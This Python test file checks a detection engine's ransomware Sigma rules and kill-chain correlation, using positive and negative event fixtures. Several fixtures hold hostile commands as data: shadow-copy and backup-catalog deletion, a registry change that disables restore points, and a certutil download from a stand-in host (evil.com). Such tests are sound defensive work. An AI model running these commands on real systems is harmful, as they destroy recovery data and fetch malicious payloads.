"""Unit tests for ransomware Sigma rules and kill-chain integrity.

Verifies:
1. All rule IDs across backend/app/rules/ are globally unique.
2. All 6 chain definitions reference only valid, existing rules.
3. Positive and negative fixtures for each of the 11 ransomware rules:
   - ransomware_shadow_delete
   - ransomware_lolbin_certutil
   - ransomware_lolbin_rundll32
   - ransomware_smb_lateral
   - ransomware_winrm_exec
   - ransomware_rdp_then_encrypt
   - ransomware_mass_extension_change
   - ransomware_canary_tripped
   - ransomware_ransom_note
   - ransomware_vss_inhibit
   - ransomware_backup_delete
4. Chain evaluation: in-order triggering vs out-of-order non-triggering.
"""

from __future__ import annotations

import glob
import time
from collections import Counter, defaultdict, deque
from pathlib import Path

import pytest
import yaml

from app.services.correlation_engine import CorrelationEngine
from app.services.rules_loader import load_rules

RULES_PATH = Path(__file__).parent.parent.parent / "app" / "rules"


def _make_engine():
    engine = CorrelationEngine.__new__(CorrelationEngine)
    engine.MAX_EVENTS = 10_000
    engine.COOLDOWN_SECONDS = 60
    engine._window = deque(maxlen=engine.MAX_EVENTS)
    engine._fired = {}
    engine._chain_fired = {}
    engine._sigma_fire_log = defaultdict(deque)
    engine._stats = {
        "events_processed": 0,
        "rules_triggered": 0,
        "chains_triggered": 0,
        "custom_rules": 0,
        "started_at": "",
    }
    engine._event_bus = None
    engine._watcher = None
    pack = load_rules(RULES_PATH)
    engine._rule_pack = pack
    engine._rules = [r for rules in pack.rules.values() for r in rules]
    engine._chain_rules = list(pack.chains)
    engine._rules_by_type = engine._build_type_index(engine._rules)
    return engine


# ---------------------------------------------------------------------------
# Test 1: Global rule ID uniqueness
# ---------------------------------------------------------------------------

def test_all_rule_ids_globally_unique():
    ids = []
    for f in glob.glob(str(RULES_PATH / "**" / "*.yaml"), recursive=True):
        with open(f, encoding="utf-8") as fh:
            data = yaml.safe_load(fh)
            if isinstance(data, dict) and "id" in data:
                ids.append(data["id"])

    counts = Counter(ids)
    duplicates = {k: v for k, v in counts.items() if v > 1}
    assert not duplicates, f"Found duplicate rule IDs in YAML rule pack: {duplicates}"


# ---------------------------------------------------------------------------
# Test 2: All 6 chain rules reference resolvable rules
# ---------------------------------------------------------------------------

def test_all_chains_reference_resolvable_rules():
    pack = load_rules(RULES_PATH)
    assert len(pack.chains) >= 6, f"Expected at least 6 chain rules, got {len(pack.chains)}"

    for chain in pack.chains:
        chain_id = chain["id"]
        for step in chain.chain:
            rule_ref = step.sigma_rule
            if rule_ref:
                assert rule_ref in pack.by_id, (
                    f"Chain '{chain_id}' references non-existent rule '{rule_ref}'"
                )


# ---------------------------------------------------------------------------
# Test 3: Positive and negative tests for each of the 11 ransomware rules
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "rule_id,pos_event,neg_event,burst_count",
    [
        # 1. ransomware_shadow_delete
        (
            "ransomware_shadow_delete",
            {
                "event_type": "process_creation",
                "command_line": "vssadmin.exe delete shadows /all /quiet",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "process_creation",
                "command_line": "notepad.exe C:\\notes.txt",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 2. ransomware_lolbin_certutil
        (
            "ransomware_lolbin_certutil",
            {
                "event_type": "process_creation",
                "process_name": "certutil.exe",
                "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "process_creation",
                "process_name": "certutil.exe",
                "command_line": "certutil -dump mycert.cer",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 3. ransomware_lolbin_rundll32
        (
            "ransomware_lolbin_rundll32",
            {
                "event_type": "process_creation",
                "process_name": "rundll32.exe",
                "command_line": "rundll32.exe C:\\Users\\User\\AppData\\Local\\Temp\\update.dll,Run",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "process_creation",
                "process_name": "rundll32.exe",
                "command_line": "rundll32.exe shell32.dll,Control_RunDLL",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 4. ransomware_smb_lateral
        (
            "ransomware_smb_lateral",
            {
                "event_type": "smb_write",
                "target_share": "\\\\C$\\Windows\\temp\\malware.exe",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "smb_write",
                "target_share": "\\\\Public\\shared\\document.pdf",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            25,  # threshold is 20
        ),
        # 5. ransomware_winrm_exec
        (
            "ransomware_winrm_exec",
            {
                "event_type": "process_creation",
                "process_path": "C:\\Windows\\System32\\wsmprovhost.exe",
                "parent_process_path": "C:\\Windows\\System32\\svchost.exe",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "process_creation",
                "process_path": "C:\\Windows\\System32\\cmd.exe",
                "parent_process_path": "C:\\Windows\\explorer.exe",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 6. ransomware_rdp_then_encrypt
        (
            "ransomware_rdp_then_encrypt",
            {
                "event_type": "rdp_login",
                "auth_result": "success",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "rdp_login",
                "auth_result": "failure",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 7. ransomware_mass_extension_change
        (
            "ransomware_mass_extension_change",
            {
                "event_type": "file_extension_change",
                "new_extension": ".locked",
                "process_pid": 8888,
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "file_extension_change",
                "new_extension": ".txt",
                "process_pid": 8888,
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            25,  # threshold is 20
        ),
        # 8. ransomware_canary_tripped
        (
            "ransomware_canary_tripped",
            {
                "event_type": "canary_touch",
                "file_path": "C:\\Users\\admin\\Documents\\.canary_tripwire.docx",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "canary_touch",
                "file_path": "C:\\Users\\admin\\Documents\\normal_report.docx",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 9. ransomware_ransom_note
        (
            "ransomware_ransom_note",
            {
                "event_type": "file_creation",
                "file_path": "C:\\Users\\admin\\Desktop\\HOW_TO_DECRYPT_FILES.txt",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "file_creation",
                "file_path": "C:\\Users\\admin\\Desktop\\meeting_notes.txt",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 10. ransomware_vss_inhibit
        (
            "ransomware_vss_inhibit",
            {
                "event_type": "registry_modification",
                "path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableAutomaticSystemRestorePoint",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "registry_modification",
                "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyProgram",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
        # 11. ransomware_backup_delete
        (
            "ransomware_backup_delete",
            {
                "event_type": "process_creation",
                "command_line": "wbadmin delete catalog -quiet",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            {
                "event_type": "process_creation",
                "command_line": "wbadmin start backup -backupTarget:E:",
                "hostname": "win-target-01",
                "source_ip": "198.51.100.20",
            },
            1,
        ),
    ],
)
def test_ransomware_rule_positive_and_negative(rule_id: str, pos_event: dict, neg_event: dict, burst_count: int):
    eng = _make_engine()
    rule = eng._rule_pack.by_id[rule_id]
    now = time.time()

    # Negative test
    for _ in range(burst_count):
        eng._window.append((now, dict(neg_event, timestamp=now)))
    assert not eng._check_rule(rule, neg_event, now), f"Rule {rule_id} incorrectly fired on negative event!"

    # Reset engine state for positive test
    eng._window.clear()
    eng._fired.clear()

    # Positive test
    for _ in range(burst_count):
        eng._window.append((now, dict(pos_event, timestamp=now)))
    assert eng._check_rule(rule, pos_event, now), f"Rule {rule_id} failed to fire on positive event!"


# ---------------------------------------------------------------------------
# Test 4: ransomware_chain in-order vs out-of-order execution
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_ransomware_chain_in_order_triggers():
    eng = _make_engine()
    now = time.time()
    source_ip = "198.51.100.77"

    # Step 1: certutil lolbin
    ev1 = {
        "event_type": "process_creation",
        "process_name": "certutil.exe",
        "command_line": "certutil -urlcache -split -f http://evil.com/mal.exe mal.exe",
        "hostname": "victim-host",
        "source_ip": source_ip,
        "timestamp": now - 100,
    }
    eng._window.append((now - 100, ev1))
    await eng.evaluate(ev1)

    # Step 2: shadow copy delete
    ev2 = {
        "event_type": "process_creation",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
        "hostname": "victim-host",
        "source_ip": source_ip,
        "timestamp": now - 50,
    }
    eng._window.append((now - 50, ev2))
    await eng.evaluate(ev2)

    # Step 3: mass extension change (requires count_threshold: 20)
    for i in range(25):
        ev3 = {
            "event_type": "file_extension_change",
            "new_extension": ".locked",
            "process_pid": 5555,
            "hostname": "victim-host",
            "source_ip": source_ip,
            "timestamp": now - 10 + i * 0.1,
        }
        eng._window.append((now - 10 + i * 0.1, ev3))

    # Triggering evaluation for Step 3
    await eng.evaluate(ev3)
    assert eng._stats["chains_triggered"] == 1
    assert ("ransomware_chain", source_ip) in eng._chain_fired


@pytest.mark.asyncio
async def test_ransomware_chain_out_of_order_does_not_trigger():
    eng = _make_engine()
    now = time.time()
    source_ip = "198.51.100.88"

    # Send Step 1 (certutil) and Step 3 (mass extension change), skipping Step 2 (shadow delete)
    ev1 = {
        "event_type": "process_creation",
        "process_name": "certutil.exe",
        "command_line": "certutil -urlcache -split -f http://evil.com/mal.exe mal.exe",
        "hostname": "victim-host",
        "source_ip": source_ip,
        "timestamp": now - 100,
    }
    eng._window.append((now - 100, ev1))
    await eng.evaluate(ev1)

    for i in range(25):
        ev3 = {
            "event_type": "file_extension_change",
            "new_extension": ".locked",
            "process_pid": 5555,
            "hostname": "victim-host",
            "source_ip": source_ip,
            "timestamp": now - 10 + i * 0.1,
        }
        eng._window.append((now - 10 + i * 0.1, ev3))

    await eng.evaluate(ev3)
    assert eng._stats["chains_triggered"] == 0
    assert ("ransomware_chain", source_ip) not in eng._chain_fired
